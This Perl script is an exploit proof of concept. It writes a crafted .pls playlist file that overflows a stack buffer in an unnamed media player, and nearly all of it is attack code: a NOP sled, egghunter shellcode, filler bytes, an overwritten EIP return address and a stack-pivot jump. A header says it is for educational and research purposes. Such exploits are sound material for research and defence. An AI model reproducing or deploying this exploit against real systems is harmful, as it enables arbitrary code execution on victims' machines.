#!/usr/bin/perl -w
# ====================================================================
#Author: Sharath Unni (@haxorhead)
#For educational and research purposes only!
# ====================================================================

#$nop="\x41" x 1026; #generated 1027
#lab-connection /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1026
#$nop = "\x90" x 1022;

$jump_size = 50; # This is the variable for 2 x SUB ESP, (jump_size)
$jump_offset = hex($jump_size) + hex($jump_size);   # Since Sub ESP,50; sub ESP,50; will point 160(100 hex) bytes top of the Stack => 1022-160 
$buffer_size = 1022; # This is the size of our Stack

$start= "[playlist]\r\nFile1=\\\\";

$nop = "\x90" x ($buffer_size - $jump_offset); 
$egghunt= "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"; 
$junk = "\xCC" x ($jump_offset - length($egghunt));
$eip = "\x4F\x61\x73\x10"."\x83\xec\x50\x83\xec\x50\xff\xe4";

$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"; open (MYFILE, '>poc-1.pls');

print MYFILE $start;
print MYFILE $nop;
print MYFILE $egghunt;
print MYFILE $junk;
print MYFILE $eip;
print MYFILE $end;
close (MYFILE);

print "Total length: ";
print length($nop . $egghunt . $junk);